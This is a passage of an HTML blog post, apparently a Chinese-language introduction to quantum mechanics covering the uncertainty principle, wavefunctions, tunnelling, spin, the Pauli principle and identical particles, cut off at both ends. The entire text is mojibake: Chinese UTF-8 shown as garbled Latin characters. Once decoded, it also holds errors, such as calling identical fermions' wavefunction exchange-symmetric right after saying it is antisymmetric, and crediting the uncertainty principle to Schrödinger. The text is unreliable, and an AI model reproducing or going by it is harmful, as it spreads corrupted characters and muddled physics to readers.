ä¸ºä¼šæœ‰æ€¥è½¬å¼¯ï¼Œè€Œå¯¼è‡´åŠ é€Ÿè¿åŠ¨ï¼Œå‘ç”Ÿè¾å°„ï¼Œå¦å¤–ä¼šè¶…è¿‡å…‰é€Ÿï¼Œè¿åäº†ç›¸å¯¹è®ºã€‚</p><p>è€Œå¦‚æœç”µå­æ˜¯ä¸€ç‰‡æ³¢åŠ¨çš„äº‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸ºä½•æ¯æ¬¡éƒ½èƒ½æ•æ‰åˆ°ä¸€ä¸ªç‚¹çš„å‘¢ï¼Ÿä»äº‘åˆ°ç‚¹çš„å˜åŒ–æ˜¯å¦‚ä½•å‘ç”Ÿçš„ã€‚</p><p>æ¨æ°åŒç¼å®éªŒï¼Œå¦‚æœä¸€ä¸ªä¸€ä¸ªçš„å‘å°„ç”µå­ï¼Œæœ€åçš„å‡ºæ¥çš„ä¹Ÿä¼šæ˜¯å¹²æ¶‰æ¡çº¹ã€‚é‚£ä¹ˆæ˜¯è°ä¸ç”µå­å‘ç”Ÿçš„å¹²æ¶‰ï¼Ÿæ˜¯è‡ªå·±å’Œè‡ªå·±å—ï¼Ÿä¸€ä¸ªç”µå­æ˜¯å¦‚ä½•åŒæ—¶é€šè¿‡äº†ä¸¤ä¸ªç¼éš™å‘ç”Ÿäº†è‡ªå·±ä¸è‡ªå·±çš„å¹²æ¶‰ï¼Ÿ</p><h2 id="ç°ä»£é‡å­åŠ›å­¦çš„å‘å±•"><a href="#ç°ä»£é‡å­åŠ›å­¦çš„å‘å±•" class="headerlink" title="ç°ä»£é‡å­åŠ›å­¦çš„å‘å±•"></a>ç°ä»£é‡å­åŠ›å­¦çš„å‘å±•</h2><h3 id="ä¸ç¡®å®šæ€§åŸç†"><a href="#ä¸ç¡®å®šæ€§åŸç†" class="headerlink" title="ä¸ç¡®å®šæ€§åŸç†"></a>ä¸ç¡®å®šæ€§åŸç†</h3><blockquote><p>æµ·æ£®å ¡è§£é‡Šäº†ä¸ç¡®å®šæ€§åŸç†ã€‚å½“æ—¶çš„ä»–å¹¶æ²¡æœ‰æ„è¯†åˆ°ï¼Œè¿™ä¸ªåŸç†å³ä»£è¡¨äº†ç‰©ç†å­¦çš„æ¢ç´¢è¾¹ç•Œï¼Œåˆæ˜¯é‡å­ä¸–ç•Œæœ€æ ¸å¿ƒçš„è§„åˆ™ã€‚</p></blockquote><p>æµ·æ£®å ¡è¯´ï¼Œç”µå­æœ‰æ—¶å€™è¡¨ç°çš„åƒç²’å­ï¼Œæœ‰æ—¶å€™åˆè¡¨ç°çš„åƒä¸ªæ³¢ï¼Œé‚£ä¹ˆå®ƒåˆ°åº•æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸ªæˆ‘ä»¬æ— æ³•æƒ³è±¡ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦æƒ³è±¡ã€‚</p><p>åº”è¯¥å…³å¿ƒçš„æ˜¯<strong>å¯æµ‹é‡</strong>çš„ä¸œè¥¿ï¼Œç”µå­çš„è½¨é“å…¶å®æ˜¯ä¸å¯æµ‹é‡çš„ã€‚</p><p>å¦‚æœæƒ³è¦å¾—åˆ°ç”µå­çš„è·¯çº¿å›¾ï¼Œé‚£ä¹ˆéœ€è¦åŒæ—¶çŸ¥é“ç”µå­çš„ä½ç½®å’Œé€Ÿåº¦ï¼ˆä¹Ÿå°±æ˜¯åŠ¨é‡$p=mv$ï¼‰ï¼Œä½†æ˜¯ï¼Œæµ·æ£®å ¡è¯´ï¼Œè¿™ä¸ªæ˜¯ä¸å¯èƒ½çš„ï¼Œä½ æ— æ³•åŒæ—¶ç²¾ç¡®çš„çŸ¥é“ç”µå­çš„ä½ç½®å’ŒåŠ¨é‡ã€‚</p><p><strong>ä½ç½®çš„æµ‹é‡è¯¯å·®å’ŒåŠ¨é‡çš„æµ‹é‡è¯¯å·®æ˜¯ä¸€ä¸ªå–èˆå…³ç³»ï¼Œä»–ä»¬ä¸å¯èƒ½éƒ½å¾ˆå°</strong></p><p>è¿™ä¸ªè§£é‡Šå¾ˆæœ‰é“ç†ï¼Œä½†æ˜¯è¿˜ä¸å¤Ÿå½»åº•ï¼Œè¿˜ä¸å¤Ÿé©å‘½ã€‚</p><p>æµ·æ£®å ¡è¯´çš„æ˜¯æµ‹ä¸å‡†ï¼Œè¯´çš„æ˜¯ä½ çš„æµ‹é‡æ‰‹æ®µæœ¬èº«ç›¸æ‚–ã€‚å› ä¸ºæƒ³æµ‹é‡ä¸€ä¸ªä¸œè¥¿å°±ä¸å¾—ä¸å¹²æ‰°è¿™ä¸ªä¸œè¥¿ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯è¿™æ ·çš„ã€‚</p><p>é‡å­åŠ›å­¦æ­£åœ¨çš„è§‚ç‚¹ä¸æ˜¯<strong>æµ‹ä¸å‡†</strong>ï¼Œè€Œæ˜¯<strong>ä¸ç¡®å®š</strong>ã€‚ä¸æ˜¯ä½ èƒ½åŠ›çš„é—®é¢˜ï¼Œè€Œæ˜¯ç”µå­çš„æœ¬æ€§é—®é¢˜ã€‚</p><p>ç”µå­æ ¹æœ¬ä¸èƒ½åŒæ—¶æ‹¥æœ‰ç¡®å®šçš„ä½ç½®å’ŒåŠ¨é‡ã€‚ç”µå­çš„è¡Œä¸ºæœ‰å†…åœ¨çš„ä¸ç¡®å®šï¼Œæ°¸è¿œéƒ½æ˜¯æ¨¡ç³Šçš„ã€‚</p><p>è¿™ä¸ªåŸç†å°±æ˜¯<strong>æµ·æ£®å ¡ä¸ç¡®å®šæ€§åŸç†</strong>ã€‚</p><p>ä¸‹é¢è¿™ä¸ªå›¾æ‰æ˜¯åŸå­çš„æ ·å­ã€‚</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/95b07a231f127e8656732a1396fab30.png" alt="Alt text | center | 300*0"></p><p>ç”µå­å¹¶ä¸æ˜¯ç»•ç€åŸå­æ ¸åšåœ†å‘¨è¿åŠ¨ï¼Œç”µå­æ²¡æœ‰ç¡®å®šçš„ä½ç½®ï¼Œå®ƒåŒæ—¶å‡ºç°åœ¨åŸå­æ ¸ä¹‹å¤–çš„å„ä¸ªåœ°æ–¹ï¼Œå‘ˆç°å‡ºæ¥çš„æ˜¯çš„æ˜¯ä¸€ç‰‡â€äº‘â€œï¼Œå…¶å®åŸå­æ ¸ä¹Ÿæ˜¯ä¸€ç‰‡â€äº‘â€œã€‚</p><p><strong>â€ä¸ç¡®å®šâ€œæ˜¯é‡å­ä¸–ç•Œçš„æœ¬è´¨ï¼Œæµ·æ£®å ¡è¦æ±‚æˆ‘ä»¬ä¸“æ³¨äºé‚£äº›èƒ½æµ‹é‡çš„ä¸œè¥¿ï¼Œå¦ç„¶æ¥å—æµ‹é‡ç»“æœçš„ä¸ç¡®å®šæ€§ã€‚</strong></p><p>ç›´åˆ°ä»Šå¤©ï¼Œæˆ‘ä»¬ä¹Ÿåªæ˜¯çŸ¥é“ç”µå­çš„ä¸€äº›â€æ€§è´¨â€œï¼Œä½†æ˜¯ç”µå­åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“ã€‚</p><h3 id="è–›å®šè°”çš„æ³¢åŠ¨æ–¹ç¨‹"><a href="#è–›å®šè°”çš„æ³¢åŠ¨æ–¹ç¨‹" class="headerlink" title="è–›å®šè°”çš„æ³¢åŠ¨æ–¹ç¨‹"></a>è–›å®šè°”çš„æ³¢åŠ¨æ–¹ç¨‹</h3><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/ebb011724d8c83747d5703f4412b942.png" alt="Alt text"></p><p>è¿™ä¸ªæ–¹ç¨‹æè¿°äº†<strong>æ³¢å‡½æ•°</strong> $Ïˆ(x,t)$ åœ¨ä¸åŒä½ç½®å’Œæ—¶é—´çš„å˜åŒ–ã€‚</p><p>æœ‰äº†è–›å®šè°”çš„æ–¹ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç²¾ç¡®çš„çŸ¥é“æ³¢å‡½æ•°åœ¨ä»»ä½•æ—¶é—´ä½ç½®çš„æ•°å€¼ã€‚</p><p>ä½†æ˜¯æ³¢å‡½æ•°åˆ°åº•æŒ‡çš„æ˜¯ä»€ä¹ˆï¼Œè¿™æ—¶å€™çš„è–›å®šè°”å¹¶ä¸æ¸…æ¥šã€‚åæ¥å¾·å›½ç‰©ç†å­¦å®¶é©¬å…‹æ–¯Â·ç»æ©æå‡ºäº†è§£é‡Š</p><blockquote><p>æ³¢å‡½æ•°ç»å¯¹å€¼çš„å¹³æ–¹ï¼Œç­‰äºç²’å­å‡ºç°åœ¨é‚£ä¸ªæ—¶é—´å’Œé‚£ä¸ªåœ°ç‚¹çš„æ¦‚ç‡</p></blockquote><p>æ²¡æœ‰è¢«è§‚æµ‹çš„ç²’å­å°±å¥½åƒæ˜¯ä¸€ç‰‡ä¸ï¼Œå®ƒæ—¢å¯ä»¥åœ¨è¿™é‡Œä¹Ÿå¯ä»¥åœ¨é‚£é‡Œï¼Œä½†æ˜¯å®ƒå‡ºç°çš„æ¦‚ç‡æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¦‚æœæ˜¯0å°±ç»å¯¹ä¸å¯èƒ½å‡ºç°ã€‚</p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>ç»æ©è§£é‡Šè¯´æ˜é‡å­åŠ›å­¦æ˜¯ä¸€ä¸ªå…³äºæ¦‚ç‡çš„ç§‘å­¦ã€‚</li><li>æ³¢å‡½æ•°æ˜¯ä¸€ä¸ªååˆ†æ€ªå¼‚çš„å­˜åœ¨ã€‚</li></ol><p>ä¸ºä»€ä¹ˆæ€ªå¼‚ï¼Ÿ å½“ç”µå­æ‰“åˆ°å±å¹•ä¸Šï¼Œä½ç½®å›ºå®šä¸‹æ¥ä»¥åï¼Œæ³¢å‡½æ•°ç¬é—´å°±åœ¨å…¶ä»–ä½ç½®éƒ½å˜æˆäº†0ã€‚è¿™å«<strong>æ³¢å‡½æ•°çš„åç¼©</strong>ã€‚ç”µå­ä»ä¸€ä¸ªâ€æ³¢â€œåç¼©æˆäº†â€ç²’å­â€œã€‚é‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æœ¬æ¥æ˜¯å…¨å±€çš„ï¼Œåç¼©åçªç„¶å˜æˆäº†ä¸€ä¸ªç‚¹ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸è¿ç»­çš„ï¼Œæ˜¯ä¸å¯é€†çš„ã€‚</p><h3 id="é‡å­éš§ç©¿"><a href="#é‡å­éš§ç©¿" class="headerlink" title="é‡å­éš§ç©¿"></a>é‡å­éš§ç©¿</h3><p>åœ¨ç»å…¸åŠ›å­¦ä¸­ï¼Œå°çƒæ˜¯ä¸å¯èƒ½å‡­ç©ºç©¿è¿‡ä¸€é¢å¢™çš„ã€‚ä½†æ˜¯åœ¨å¾®è§‚çš„é‡å­ä¸–ç•Œä¸­ï¼Œç©¿è¿‡å¢™å£åªæ˜¯ä¸€ä¸ªæ¦‚ç‡é—®é¢˜ã€‚</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/8588f9399d49ecaebaa74b9af313276.png" alt="Alt text | center"></p><p>å›¾ä¸­çš„Eæ˜¯ç²’å­çš„èƒ½é‡ï¼Œè€ŒVæ˜¯å¢™çš„åŠ¿èƒ½ã€‚ å¢™çš„åŠ¿èƒ½Væ¯”ç²’å­çš„èƒ½é‡Eé«˜ï¼Œæ‰€ä»¥å¢™å¯¹ç²’å­é€ æˆäº†é™åˆ¶ã€‚</p><p>æ³¢å‡½æ•°åœ¨ç»è¿‡å¢™è¿…é€Ÿè¡°å‡ï¼Œè™½ç„¶æ³¢åŠ¨å¹…åº¦å°äº†ï¼Œä½†å¹¶ä¸æ˜¯ä¸€æ¡ç›´çº¿ï¼Œæ‰€ä»¥æ ¹æ®ç»æ©è§£é‡Šï¼Œç²’å­æ˜¯å¯ä»¥åˆ°è¾¾å¢™åé¢çš„ã€‚</p><p>èƒ½é‡å°çš„ç²’å­ç©¿è¿‡äº†åŠ¿èƒ½å¤§çš„ç‰©è´¨ï¼Œå°±å«åš<strong>é‡å­éš§ç©¿</strong>ã€‚</p><p>é‡å­éš§ç©¿åœ¨å¾ˆå¤šæ–¹é¢éƒ½æœ‰åº”ç”¨å’Œä½“ç°ï¼š</p><ol><li><p>è´¨å­å’Œä¸­å­çš„åŠ¨èƒ½æ¯”ç»“åˆåŠ›çš„åŠ¿èƒ½å°ï¼Œä½†æ˜¯ä»–ä»¬èƒ½è·‘å‡ºæ¥ï¼Œè¿™å°±é€ æˆäº†å‘å°„æ€§åŸå­æ ¸è¡°å˜ã€‚è¿™æ˜¯é‡å­éš§ç©¿çš„åŠŸåŠ³ã€‚</p></li><li><p>æ ¸èšå˜è¦æ±‚åŸå­æ ¸ä¸åŸå­æ ¸å…‹æœåº“ä»‘ä½åŠ¿å’ï¼Œå•ç‹¬çš„çƒ­èƒ½æ— æ³•è¾¾åˆ°ä»¥ä¿ƒæˆæ ¸èšå˜ã€‚ä½†æ˜¯é‡å­éš§ç©¿èƒ½å¤Ÿçªç ´ï¼Œæ‰æœ‰äº†æ ¸èšå˜ï¼Œæ‰æœ‰äº†å¤ªé˜³ã€‚</p></li><li><p>DNAçš„è‡ªå‘æ€§çªå˜ï¼Œè´¨å­éš§ç©¿é€è¿‡äº†DNAçš„ç¢±åŸºå¯¹çš„æ°¢é”®ä½åŠ¿å’ï¼Œä½¿å¾—DNAå¤åˆ¶ä¸­å‘ç”Ÿçªå˜ï¼Œè¿™æ‰æœ‰äº†ä¸°å¯Œå¤šæ ·çš„ä¸–ç•Œã€‚</p></li></ol><h3 id="ç‹„æ‹‰å…‹å¼•é¢†çš„é‡å­ç”µåŠ¨åŠ›å­¦"><a href="#ç‹„æ‹‰å…‹å¼•é¢†çš„é‡å­ç”µåŠ¨åŠ›å­¦" class="headerlink" title="ç‹„æ‹‰å…‹å¼•é¢†çš„é‡å­ç”µåŠ¨åŠ›å­¦"></a>ç‹„æ‹‰å…‹å¼•é¢†çš„é‡å­ç”µåŠ¨åŠ›å­¦</h3><p>ä¿ç½—Â·ç‹„æ‹‰å…‹èåˆäº†ç‹­ä¹‰ç›¸å¯¹è®ºçš„æ³¢åŠ¨æ–¹ç¨‹å«åš<strong>ç‹„æ‹‰å…‹æ–¹ç¨‹</strong>ï¼Œè¿™ä¸ªæ–¹ç¨‹è§£å‡ºäº†ä¸¤ä¸ªæ–°ä¸œè¥¿ï¼š</p><ol><li>æœ‰æ­£ç”µå­ï¼Œ è¿™ä¸ªæ˜¯äººç±»å‘ç°çš„ç¬¬ä¸€ä¸ªåç‰©è´¨</li><li><strong>è‡ªæ—‹</strong></li></ol><p class='quest'>ä»€ä¹ˆæ˜¯è‡ªæ—‹ï¼Ÿ<p class='answer'>ç”µå­ç»•ç€åŸå­æ ¸åšæ—‹è½¬ä¹‹å¤–ï¼Œè‡ªèº«è¿˜æœ‰ä¸€ä¸ªæ—‹è½¬ï¼Œè¿™ä¸ªè‡ªèº«æ—‹è½¬çš„è§’åŠ¨é‡æ˜¯â€œé‡å­åŒ–â€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒçš„è§’åŠ¨é‡åªæœ‰â€œ1/2â€å’Œâ€œ-1/2â€ä¸¤ä¸ªå€¼ï¼Œæˆ‘ä»¬æŠŠç”µå­çš„è‡ªèº«æ—‹è½¬ç§°ä¸ºè‡ªæ—‹ã€‚<p>ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œè¿™é‡Œçš„è‡ªæ—‹æ˜¯æ— æ³•å½¢è±¡çš„ç†è§£çš„ã€‚ç”µå­çš„è‡ªæ—‹ä¸º1/2ï¼Œé‚£ä¹ˆæŠŠç”µå­æƒ³è±¡æˆå°çƒçš„è¯ï¼Œè¿™ä¸ªå°çƒå¿…é¡»è½¬ä¸¤åœˆæ‰èƒ½å›åˆ°åŸæ¥çš„æ ·å­ã€‚å¹¶ä¸”æ ¹æ®è‡ªæ—‹è§’åŠ¨é‡çš„è®¡ç®—ï¼Œè¿™ä¸ªå°çƒçš„è¡¨é¢é€Ÿåº¦å·²ç»è¶…è¿‡äº†å…‰é€Ÿï¼Œè¿™ä¸ªä¸åˆç†ã€‚</p><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œç‰©ç†å­¦å®¶å¯¹ç”µå­çš„ç†è§£åªæ˜¯çŸ¥é“äº†å®ƒçš„å„ç§å†…åœ¨å±æ€§ï¼Œä½†æ˜¯ç”µå­åˆ°åº•æ˜¯ä»€ä¹ˆæˆ‘ä»¬å¹¶ä¸æ¸…æ¥šã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>è‡ªæ—‹æ˜¯ç”µå­çš„ä¸€ä¸ªå†…åœ¨å±æ€§ï¼Œæ˜¯ä¸€ä¸ªå…·æœ‰è§’åŠ¨é‡ç‰¹ç‚¹çš„æ€§è´¨</strong></p><p>å°†ç”µå­è‡ªæ—‹çš„çŠ¶æ€æ ‡ç¤ºï¼Œå¯ä»¥å†™æˆ<br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/3ccc9de8992d16efc2275924a9c7259.png" alt="Alt text| center | 300*0"></p><p>ç‹„æ‹‰å…‹å‘æ˜çš„â€œåŠä¸ªæ‹¬å·â€ ï¼ˆâ€**|&gt;<strong>â€œï¼‰è¡¨ç¤ºäº†ä¸€ä¸ªé‡å­æ€ï¼Œæ‰€ä»¥è¿™ä¸ªå…¬å¼è¯´çš„æ˜¯ç”µå­çš„é‡å­æ€æ˜¯è‡ªæ—‹æ–¹å‘ä¸Šçš„ä¸¤ä¸ªæ­£è´Ÿé‡å­æ€ä¹‹å’Œã€‚è¿™ä¸ªå°±æ˜¯â€œ</strong>é‡å­å åŠ æ€**â€</p><p>ç”µå­çš„è‡ªæ—‹æè¿°çš„æ˜¯ä¸€ä¸ªæ–¹å‘ä¸Šçš„ç”µå­çš„è‡ªæ—‹çš„é‡å­æ€ï¼Œåœ¨å¦å¤–ä¸€ä¸ªæ–¹å‘ä¸Šï¼Œæœ‰ç€å¦ä¸€ä¸ªï¼Œå®Œå…¨ä¸ç›¸å¹²çš„è‡ªæ—‹é‡å­æ€ã€‚</p><p>æ¯”å¦‚è¯´æˆ‘ä»¬æ˜¯åœ¨xæ–¹å‘ä¸Šè§‚å¯Ÿç”µå­çš„é‡å­æ€ï¼Œå¯ä»¥å¾—åˆ°<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/11af993e137cc9196dd1475e562ddc9.png" alt="Alt text | 200*0"><br>åŒæ ·æˆ‘ä»¬è§‚æµ‹zæ–¹å‘ä¸Šçš„ç”µå­çš„è‡ªæ—‹é‡å­æ€ï¼Œå¯ä»¥å¾—åˆ°<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/c34780b706571ea14ca0b34a798c5cd.png" alt="Alt text | 200*0"><br>è¿™ä¸¤ä¸ªæ–¹å‘ä¸Šçš„é‡å­å åŠ æ€æ˜¯äº’ä¸ç›¸å¹²çš„ã€‚</p><ul><li>ç°åœ¨æˆ‘ä»¬æ›´è¿›ä¸€æ­¥ï¼š</li></ul><p>åœ¨æˆ‘ä»¬è§‚å¯Ÿzæ–¹å‘æ­£1/2è‡ªæ—‹ç”µå­åçš„ï¼Œç»§ç»­å¯¹è¿™ä¸ªç”µå­è¿›è¡Œxæ–¹å‘çš„è§‚æµ‹ï¼Œé‚£ä¹ˆå®ƒåŒæ ·ä¼šæœ‰xæ–¹å‘çš„å åŠ æ€<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/aa96b3e5b76f2c313615001349d9fd6.png" alt="Alt text|200*0"></p><p>æ›´è¿›ä¸€æ­¥ï¼Œå¦‚æœç»§ç»­åœ¨xæ–¹å‘å¯¹è§‚æµ‹åˆ°çš„xæ–¹å‘çš„åç¼©çš„ç”µå­è¿›è¡Œè§‚æµ‹ï¼Œé‚£ä¹ˆå®ƒä¿æŒåŸæ¥çš„è‡ªæ—‹æ€æ€§è´¨ä¸å˜ã€‚</p><p>ä»–çš„è¿‡ç¨‹æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼š<br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/aae536a7b0c30cb3717847ba22dffcf.png" alt="Alt text| center | 700*0"></p><p>è¿™æ ·çš„æ€§è´¨è¢«<strong>å†¯Â·è¯ºä¾æ›¼æŠ•å½±å…¬è®¾</strong>è§£é‡Šï¼š</p><ol><li>æ¯ä¸ªé‡å­æ€ï¼Œéƒ½å¯ä»¥å±•å¼€æˆä¸€ç³»åˆ—åŸºæœ¬çš„é‡å­æ€çš„å åŠ   <img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/fa666bc9763be81afa3be6deb4b701c.png" alt="Alt text| 200*0"></li><li>ä¸€æ¬¡å®éªŒè§‚æµ‹åï¼Œç³»ç»Ÿå°±åç¼©åˆ°å…¶ä¸­çš„ä¸€ä¸ªæ€e_iã€‚è€Œåˆ°åº•åç¼©åˆ°å“ªä¸ªæ€ï¼Œç”±ç³»æ•°c_içš„ç»å¯¹å€¼çš„å¹³æ–¹å†³å®šã€‚</li><li>ä»æ­¤ä»¥åï¼Œç³»ç»Ÿå°±ä¸€ç›´å¤„äºe_iæ€ã€‚ä½†å¦‚æœe_iæ€è¿˜æœ‰ä¸ç¡®å®šæ€§ï¼Œç³»ç»Ÿå°±å¯ä»¥å†æ¬¡è¢«è§‚æµ‹åˆ°åˆ«çš„æ€ï¼Œæ–¹æ³•ä»ç„¶ä½¿ç”¨é‡å­æ€å åŠ å±•å¼€ã€‚</li></ol><p>é‚£ä¹ˆå“ªéƒ¨åˆ†æ˜¯å±äºé‡å­ç”µåŠ¨åŠ›å­¦çš„å‘¢ï¼Ÿ<br>è¿™ä¹ˆè¯´å§ã€‚å¼•åŠ›ï¼Œå±äºå¹¿ä¹‰ç›¸å¯¹è®ºçš„èŒƒç•´ï¼ŒåŸå­æ ¸ä»¥å†…çš„å±äºæ›´ç°ä»£ç‰©ç†ç†è®ºã€‚ä¸è€ƒè™‘å¼•åŠ›ï¼Œåœ¨åŸå­æ ¸ä¹‹å¤–çš„æ‰€æœ‰çš„ä¸‡äº‹ä¸‡ç‰©éƒ½å½’é‡å­ç”µåŠ¨åŠ›å­¦ç®¡</p><h3 id="æ³¡åˆ©ä¸ç›¸å®¹åŸç†"><a href="#æ³¡åˆ©ä¸ç›¸å®¹åŸç†" class="headerlink" title="æ³¡åˆ©ä¸ç›¸å®¹åŸç†"></a>æ³¡åˆ©ä¸ç›¸å®¹åŸç†</h3><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/85e27b3308331e0c1f638db77af2f2f.png" alt="Alt text | center | 500*0"></p><p>ä¸Šå›¾æ˜¯ç”µå­äº‘å›¾ï¼Œé¢œè‰²çš„æ·±æµ…ä»£è¡¨äº†ç”µå­åœ¨ä¸€ä¸ªåœ°æ–¹è¢«å‘ç°çš„æ¦‚ç‡ã€‚</p><p>å®Œå…¨ç¡®å®šç”µå­çš„çŠ¶æ€ï¼Œéœ€è¦4ä¸ªâ€œé‡å­æ•°â€ã€‚</p><ol><li>ä¸»é‡å­æ•°<code>n</code>ï¼Œ ä»£è¡¨ç”µå­æ‰€å¤„çš„èƒ½çº§ï¼Œèƒ½çº§è¶Šé«˜ï¼Œç”µå­å‡ºç°åœ¨é‚£é‡Œçš„æ¦‚ç‡è¶Šä½ã€‚</li><li>è§’åŠ¨é‡é‡å­æ•° <code>l</code>,ä»£è¡¨ç”µå­è½¨é“çš„å½¢çŠ¶ï¼Œä¹Ÿå°±æ˜¯ç”µå­äº‘çš„å½¢çŠ¶ï¼Œl=0ä¸ºçƒå½¢ï¼Œlè¶Šå¤§ï¼Œç”µå­äº‘è¶Šæ‰ã€‚</li><li>ç£é‡å­æ•°<code>m</code>, ä»£è¡¨è½¨é“çš„æ–¹å‘ã€‚</li><li>è‡ªæ—‹é‡å­æ•°ã€‚</li></ol><p>æ³¡åˆ©ä¸ç›¸å®¹åŸç†è¯´ï¼Œ<strong>ä¸€ä¸ªåŸå­çš„ä»»ä½•ä¸¤ä¸ªç”µå­çš„æ˜¯ä¸ªé‡å­æ•°ï¼Œä¸èƒ½å®Œå…¨ç›¸åŒã€‚</strong></p><p>æ­£å› ä¸ºæœ‰äº†æ³¡åˆ©ä¸ç›¸å®¹åŸç†ï¼Œæ‰èƒ½è®©ç”µå­ä¸ä¼šå…¨éƒ¨é›†ä¸­åœ¨ä½èƒ½çº§ä¸Šã€‚å¤§åŸå­çš„åŠ¿åŠ›èŒƒå›´æ‰æ›´å¤§ï¼Œæ‰èƒ½æœ‰å¤–å±‚ç”µå­å†³å®šå„ç§åŒ–å­¦æ€§è´¨ã€‚ä¸–ç•Œæ‰å¦‚æ­¤å¤šå§¿å¤šå½©ã€‚</p><p>ä¸ºä»€ä¹ˆç”µå­ä¼šéµå®ˆæ³¡åˆ©ä¸ç›¸å®¹åŸç†å‘¢ï¼Ÿæ ¹æœ¬åŸå› æ˜¯è‡ªæ—‹çš„æ•°å­¦ã€‚</p><p>æ‰€æœ‰çš„åŸºæœ¬ç²’å­åˆ†ä¸ºä¸¤ç±»ï¼š</p><ol><li><strong>ç»è‰²å­</strong>ï¼Œ å®ƒä»¬çš„è‡ªæ—‹æ˜¯æ•´æ•°ï¼Œå®ƒä»¬æ˜¯åŠ›çš„ä¼ æ’­è€…ï¼Œåƒèƒ¶å­ã€ä»‹å­ã€å¸Œæ ¼æ–¯ç²’å­å’Œæƒ³è±¡ä¸­çš„å¼•åŠ›å­éƒ½æ˜¯ç»è‰²å­ã€‚å…‰å­ä¹Ÿæ˜¯ç»è‰²å­ï¼Œè‡ªæ—‹æ˜¯1</li><li><strong>è´¹ç±³å­</strong>ï¼Œ å®ƒä»¬çš„è‡ªæ—‹æ˜¯åŠæ•´æ•°ï¼Œä¹Ÿå°±æ˜¯Â±1/2ã€Â±3/2ã€Â±5/2è¿™æ ·ï¼Œè´¹ç±³å­æ˜¯åŠ›çš„æ„Ÿå—è€…ã€‚åƒç”µå­ã€è´¨å­ã€ä¸­å­éƒ½æ˜¯è´¹ç±³å­ã€‚</li></ol><p>åœ¨æ•°å­¦ä¸Šï¼Œç»è‰²å­çš„æ³¢å‡½æ•°å…·æœ‰äº¤æ¢å¯¹ç§°æ€§ï¼Œè€Œè´¹ç±³å­çš„æ³¢å‡½æ•°å…·æœ‰åäº¤æ¢å¯¹ç§°æ€§ã€‚ä¸¤ä¸ªå…¨åŒè´¹ç±³å­çš„æ³¢å‡½æ•°ä¸€å®šæ˜¯äº¤æ¢å¯¹ç§°çš„ï¼Œè€Œå¯¹ç§°çš„ä¸­å¿ƒç‚¹å¿…é¡»æ˜¯0ï¼Œè€Œ0ä»£è¡¨äº†æ‰€æœ‰é‡å­æ•°éƒ½ç›¸åŒï¼Œæ‰€ä»¥é‡å­æ•°ä¸èƒ½å®Œå…¨ç›¸åŒã€‚</p><blockquote><p>ç®€å•çš„æ¥è¯´<br>ä¹‹æ‰€ä»¥æœ‰åŒ–å­¦ï¼Œæ˜¯å› ä¸ºæ³¡åˆ©ä¸ç›¸å®¹åŸç†ï¼›<br>ä¹‹æ‰€ä»¥æœ‰æ³¡åˆ©ä¸ç›¸å®¹åŸç†ï¼Œæ˜¯å› ä¸ºè´¹ç±³å­æ³¢å‡½æ•°æ˜¯åå¯¹ç§°çš„ã€‚<br>ä¹‹æ‰€ä»¥è´¹ç±³å­æ³¢å‡½æ•°æ˜¯åå¯¹ç§°çš„ï¼Œæ˜¯å› ä¸ºè‡ªæ—‹ï¼›<br>ä¹‹æ‰€ä»¥æœ‰è‡ªæ—‹ï¼Œæ˜¯å› ä¸ºé‡å­ç”µåŠ¨åŠ›å­¦ï¼›<br><strong>è®¾å®šäº†é‡å­ç”µåŠ¨åŠ›å­¦ï¼Œå°±è®¾å®šäº†åŸå­æ ¸ä»¥å¤–çš„ä¸–ç•Œ</strong></p></blockquote><h3 id="å…¨åŒç²’å­"><a href="#å…¨åŒç²’å­" class="headerlink" title="å…¨åŒç²’å­"></a>å…¨åŒç²’å­</h3><p>åœ¨é‡å­çš„å¾®è§‚ä¸–ç•Œï¼Œä½ æ˜¯ä¸èƒ½åŒºåˆ†ä¸¤ä¸ªç²’å­çš„åŒºåˆ«çš„ï¼Œç”µå­ä¸ç”µå­ï¼Œè´¨å­ä¸è´¨å­ï¼Œä»–ä»¬å®Œå…¨ç›¸åŒï¼Œæ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œç”šè‡³è¿ä½ç½®ä¿¡æ¯ï¼Œå› ä¸ºè–›å®šè°”ä¸ç¡®å®šæ€§åŸç†ï¼Œä½ ä¹Ÿä¸èƒ½é€šè¿‡ä½ç½®æ¥å´åˆ«ç²’å­ã€‚</p><h3 id="å“¥æœ¬å“ˆæ ¹è¯ é‡Š"><a href="#å“¥æœ¬å“ˆæ ¹è¯ é‡Š" class="headerlink" title="å“¥æœ¬å“ˆæ ¹è¯ é‡Š"></a>å“¥æœ¬å“ˆæ 